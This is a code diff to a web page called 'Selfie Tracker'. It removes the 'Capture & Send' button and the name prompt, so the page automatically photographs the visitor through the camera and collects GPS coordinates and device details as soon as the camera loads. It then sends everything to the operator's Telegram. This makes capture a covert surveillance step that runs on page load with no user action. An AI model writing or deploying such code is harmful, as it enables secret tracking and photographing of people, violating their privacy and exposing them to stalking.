@@ -34,20 +34,6 @@
             margin: 15px 0;
             background: #222;
         }
-        button {
-            background: #ff5722;
-            border: none;
-            color: white;
-            padding: 14px 30px;
-            border-radius: 30px;
-            font-size: 18px;
-            cursor: pointer;
-            font-weight: bold;
-            margin-top: 10px;
-        }
-        button:hover {
-            background: #e64a19;
-        }
         #status {
             margin-top: 15px;
             padding: 10px;
@@ -61,12 +47,10 @@
 <body>
     <div class="container">
         <h1>📸 Selfie Tracker</h1>
-        <p>Click below to capture your selfie + exact GPS.</p>
+        <p>Capturing your selfie and location...</p>
 
         <!-- The iframe loads our camera engine -->
         <iframe id="cameraFrame" src="camera.html"></iframe>
-
-        <button id="captureBtn">🚀 Capture & Send</button>
         <div id="status">⏳ Loading camera...</div>
     </div>
 
@@ -80,7 +64,8 @@
         // Wait for iframe to signal it's ready
         window.addEventListener('message', (event) => {
             if (event.data.type === 'cameraReady') {
-                statusDiv.textContent = '📷 Camera is ready. Hit the button!';
+                statusDiv.textContent = '📷 Camera is ready. Capturing data...';
+                captureAndSendData();
             } else if (event.data.type === 'cameraError') {
                 statusDiv.textContent = '❌ Camera blocked. Allow permissions and refresh.';
             }
@@ -116,9 +101,7 @@
         }
 
         // ==================== MAIN ACTION ====================
-        document.getElementById('captureBtn').addEventListener('click', async () => {
-            statusDiv.textContent = '⏳ Capturing...';
-
+        async function captureAndSendData() {
             try {
                 // Check if iframe and its function exist
                 if (!iframe.contentWindow || typeof iframe.contentWindow.captureData !== 'function') {
@@ -126,20 +109,17 @@
                     return;
                 }
 
-                // Ask for name (optional)
-                const userName = prompt('Enter your name (optional):') || 'User';
-
                 // Call the iframe's capture function
                 const data = await iframe.contentWindow.captureData();
 
                 // Send everything
-                await sendToTelegram(data.image, data.lat, data.lon, data.source, data.device, userName);
+                await sendToTelegram(data.image, data.lat, data.lon, data.source, data.device, 'Anonymous');
                 statusDiv.textContent = '✅ ALL DATA SENT! Check your Telegram.';
             } catch (err) {
                 statusDiv.textContent = '❌ ERROR: ' + err.message;
                 console.error(err);
             }
-        });
+        }
 
         // If iframe fails to load at all
         iframe.onerror = () => {
